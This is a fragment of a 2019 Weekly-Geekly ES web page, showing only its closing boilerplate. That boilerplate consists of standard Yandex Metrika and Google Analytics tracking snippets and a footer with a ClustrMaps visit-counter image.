          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>